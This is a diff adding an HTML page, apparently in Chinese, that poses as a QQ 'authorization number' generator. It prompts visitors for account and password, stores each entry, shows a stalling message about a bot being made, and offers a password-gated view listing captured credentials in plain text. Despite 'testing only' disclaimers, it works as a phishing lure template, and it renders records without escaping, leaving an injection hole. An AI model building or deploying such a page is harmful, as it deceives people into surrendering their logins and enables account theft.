@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QQ号转换授权号<工具></title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: "Microsoft YaHei", sans-serif;
+        }
+        body {
+            min-height: 100vh;
+            padding: 20px;
+            background: linear-gradient(135deg, #39d88f, #ffce55);
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: #fff;
+            border-radius: 8px;
+            padding: 30px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+        }
+        .title {
+            text-align: center;
+            color: #333;
+            margin: 0 0 25px;
+            font-size: 22px;
+        }
+        .note, .warning-note {
+            font-size: 12px;
+            padding: 10px;
+            border-radius: 4px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .note {
+            color: #999;
+            background: #f8f8f8;
+        }
+        .warning-note {
+            color: #ff4d4f;
+            background: #fff3f3;
+        }
+
+        /* 登录页样式 */
+        .login-page {
+            display: block;
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+        }
+        .logo p {
+            margin-top: 10px;
+            font-size: 20px;
+            color: #333;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            color: #666;
+        }
+        .input-group input {
+            width: 100%;
+            height: 45px;
+            padding: 0 15px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .input-group input:focus {
+            outline: none;
+            border-color: #4d90fe;
+        }
+        .btn {
+            width: 100%;
+            height: 45px;
+            background: #4d90fe;
+            border: none;
+            border-radius: 4px;
+            color: #fff;
+            font-size: 16px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #357ae8;
+        }
+        .btn:disabled {
+            background: #b8c9e6;
+            cursor: not-allowed;
+        }
+
+        /* 条款样式 */
+        .terms-container {
+            margin: 15px 0;
+            font-size: 12px;
+        }
+        .terms-checkbox {
+            display: flex;
+            align-items: center;
+        }
+        .terms-checkbox input {
+            width: 14px;
+            height: 14px;
+            margin-right: 8px;
+        }
+        .terms-link {
+            color: #4d90fe;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+
+        /* 记录页样式 */
+        .record-page {
+            display: none;
+        }
+        .btn-group {
+            margin-top: 20px;
+            display: flex;
+            gap: 10px;
+        }
+        .clear-btn {
+            background: #ff4d4f;
+        }
+        .clear-btn:hover {
+            background: #d9363e;
+        }
+        .record-list {
+            margin-top: 20px;
+        }
+        .record-item {
+            padding: 15px;
+            border: 1px solid #eee;
+            border-radius: 4px;
+            margin-bottom: 10px;
+        }
+        .record-item p {
+            margin: 5px 0;
+            color: #666;
+        }
+        .empty-tip {
+            color: #999;
+            text-align: center;
+            padding: 30px 0;
+            border: 1px dashed #eee;
+            border-radius: 4px;
+        }
+
+        /* 弹窗样式 */
+        .terms-modal, .verify-modal, .custom-alert-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            width: 90%;
+            max-width: 500px;
+            background: #fff;
+            border-radius: 8px;
+            padding: 20px;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .modal-title {
+            font-size: 16px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-align: center;
+        }
+        .modal-text {
+            font-size: 14px;
+            line-height: 1.6;
+            color: #333;
+        }
+        .close-modal {
+            width: 100%;
+            height: 40px;
+            background: #4d90fe;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            margin-top: 20px;
+            cursor: pointer;
+        }
+        .error-tip {
+            color: #ff4d4f;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 10px;
+            display: none;
+        }
+        .red-text {
+            color: #ff4d4f;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- 登录页 -->
+        <div class="login-page">
+            <div class="logo">
+                <img src="https://www.123912.com/s/N8IwTd-L03Td" alt="模拟Logo">
+                <p>授权号制作器</p>
+            </div>
+            <form id="loginForm">
+                <div class="input-group">
+                    <label for="account">账号</label>
+                    <input type="text" id="account" required placeholder="请输入账号">
+                </div>
+                <div class="input-group">
+                    <label for="password">密码</label>
+                    <input type="password" id="password" required placeholder="请输入密码">
+                </div>
+                
+                <div class="terms-container">
+                    <div class="terms-checkbox">
+                        <input type="checkbox" id="agreeTerms" required>
+                        <label for="agreeTerms">我已阅读并同意<a class="terms-link" id="showTerms">《Mo转换工具使用条款》</a></label>
+                    </div>
+                </div>
+                
+                <button type="submit" class="btn" id="loginBtn" disabled>登录</button>
+                <button type="button" class="btn" id="toRecordBtn">查看授权号记录</button>
+            </form>
+            <p class="note">仅用于测试 无任何违法行为</p>
+        </div>
+
+        <!-- 记录页 -->
+        <div class="record-page">
+            <h2 class="title">账号密码记录列表</h2>
+            <div class="btn-group">
+                <button class="btn clear-btn" id="clearAll">清空所有记录</button>
+                <button class="btn" id="goBack">返回登录页</button>
+            </div>
+            <div class="record-list" id="recordList"></div>
+            <p class="warning-note">本地存储易泄露，请勿存储真实账号密码</p>
+        </div>
+    </div>
+
+    <!-- 条款弹窗 -->
+    <div class="terms-modal" id="termsModal">
+        <div class="modal-content">
+            <div class="modal-title">使用条款</div>
+            <div class="modal-text">
+              <p>使用本“授权号制作器”模拟工具即表示您同意以下条款：</p>
+                <p>1. 本工具仅为技术测试用途，旨在演示账号密码前端存储逻辑。</p>
+                <p>2. 您不得将其用于任何实际账号登录、非法数据获取等违规行为。</p>
+                <p>3. 测试数据仅存储于本地浏览器，绝对不会对外泄露。bot机器人制作完毕后将会发放到<查看授权号></p>
+                <p>4. 若您违反上述条款，将自行承担相应责任，开发者不承担任何法律责任。</p>
+                <p>5. 如侵权到您的利益，请联系我进行处理。</p>
+                <p>TG号: @HOK03</p>
+                <p>海鸥号: 65189768</p>
+                <p>制作人: Mo 黎川 坚凤</p>
+            </div>
+            <button class="close-modal" id="closeTermsModal">关闭</button>
+        </div>
+    </div>
+
+    <!-- 密码验证弹窗 -->
+    <div class="verify-modal" id="verifyModal">
+        <div class="modal-content">
+            <div class="modal-title">验证身份</div>
+            <div class="modal-text">请输入查看记录的密码</div>
+            <div class="input-group">
+                <label for="verifyPassword">验证密码</label>
+                <input type="password" id="verifyPassword" placeholder="请输入密码">
+            </div>
+            <div class="error-tip" id="errorTip">密码错误 ❎ / 机器人暂未制作完成</div>
+            <div class="btn-group" style="margin-top:15px;gap:10px;display:flex;">
+                <button class="btn" id="confirmVerify">确认</button>
+                <button class="btn close-modal" id="cancelVerify">取消</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- 自定义提示弹窗 -->
+    <div class="custom-alert-modal" id="customAlertModal">
+        <div class="modal-content">
+            <div class="modal-text">
+                记录成功 <span class="red-text">您的密码: a25316aa.</span> 制作机器人正在制作 请您在30分钟后进入到该网站 输入密码 如在机器人制作中输入密码将不会进您的入到授权号查看系统
+            </div>
+            <button class="close-modal" id="closeAlertModal">确定</button>
+        </div>
+    </div>
+
+    <script>
+        // 元素获取
+        const loginPage = document.querySelector('.login-page');
+        const recordPage = document.querySelector('.record-page');
+        const recordList = document.getElementById('recordList');
+        const agreeTerms = document.getElementById('agreeTerms');
+        const loginBtn = document.getElementById('loginBtn');
+        const termsModal = document.getElementById('termsModal');
+        const verifyModal = document.getElementById('verifyModal');
+        const verifyPassword = document.getElementById('verifyPassword');
+        const customAlertModal = document.getElementById('customAlertModal');
+
+        // 条款弹窗控制
+        document.getElementById('showTerms').addEventListener('click', (e) => {
+            e.preventDefault();
+            termsModal.style.display = 'flex';
+        });
+        document.getElementById('closeTermsModal').addEventListener('click', () => {
+            termsModal.style.display = 'none';
+        });
+        termsModal.addEventListener('click', (e) => {
+            if (e.target === termsModal) termsModal.style.display = 'none';
+        });
+
+        // 登录按钮启用控制
+        agreeTerms.addEventListener('change', () => {
+            loginBtn.disabled = !agreeTerms.checked;
+        });
+
+        // 查看记录按钮：打开验证弹窗
+        document.getElementById('toRecordBtn').addEventListener('click', () => {
+            verifyPassword.value = '';
+            document.getElementById('errorTip').style.display = 'none';
+            verifyModal.style.display = 'flex';
+        });
+
+        // 验证密码逻辑
+        document.getElementById('confirmVerify').addEventListener('click', () => {
+            const correctPwd = 'Mo1472580369';
+            const inputPwd = verifyPassword.value.trim();
+            
+            if (inputPwd === correctPwd) {
+                verifyModal.style.display = 'none';
+                loginPage.style.display = 'none';
+                recordPage.style.display = 'block';
+                renderRecords();
+            } else {
+                document.getElementById('errorTip').style.display = 'block';
+            }
+        });
+
+        // 取消验证/关闭弹窗
+        document.getElementById('cancelVerify').addEventListener('click', () => {
+            verifyModal.style.display = 'none';
+        });
+        verifyModal.addEventListener('click', (e) => {
+            if (e.target === verifyModal) verifyModal.style.display = 'none';
+        });
+
+        // 自定义弹窗关闭
+        document.getElementById('closeAlertModal').addEventListener('click', () => {
+            customAlertModal.style.display = 'none';
+        });
+        customAlertModal.addEventListener('click', (e) => {
+            if (e.target === customAlertModal) customAlertModal.style.display = 'none';
+        });
+
+        // 返回登录页
+        document.getElementById('goBack').addEventListener('click', () => {
+            recordPage.style.display = 'none';
+            loginPage.style.display = 'block';
+        });
+
+// 登录与存储逻辑
+document.getElementById('loginForm').addEventListener('submit', (e) => {
+    e.preventDefault();
+    const account = document.getElementById('account').value;
+    const password = document.getElementById('password').value;
+    
+    if (account && password) {
+        const userList = JSON.parse(localStorage.getItem('userAccounts') || '[]');
+        userList.push({ account, password, time: new Date().toLocaleString() });
+        localStorage.setItem('userAccounts', JSON.stringify(userList));
+        // 显示自定义弹窗
+        customAlertModal.style.display = 'flex';
+        document.getElementById('account').value = '';
+        document.getElementById('password').value = '';
+    }
+});
+
+        // 渲染记录
+        function renderRecords() {
+            const userList = JSON.parse(localStorage.getItem('userAccounts') || '[]');
+            if (userList.length === 0) {
+                recordList.innerHTML = '<div class="empty-tip">暂无记录</div>';
+                return;
+            }
+            recordList.innerHTML = userList.map((item, i) => `
+                <div class="record-item">
+                    <p><strong>序号：</strong>${i + 1}</p>
+                    <p><strong>账号：</strong>${item.account}</p>
+                    <p><strong>密码：</strong>${item.password}</p>
+                    <p><strong>时间：</strong>${item.time}</p>
+                </div>
+            `).join('');
+        }
+
+        // 清空记录
+        document.getElementById('clearAll').addEventListener('click', () => {
+            if (confirm('确定要清空所有记录吗❓清空后不可恢复❗️')) {
+                localStorage.removeItem('userAccounts');
+                renderRecords();
+                alert('已清空');
+            }
+        });
+    </script>
+</body>
+</html>
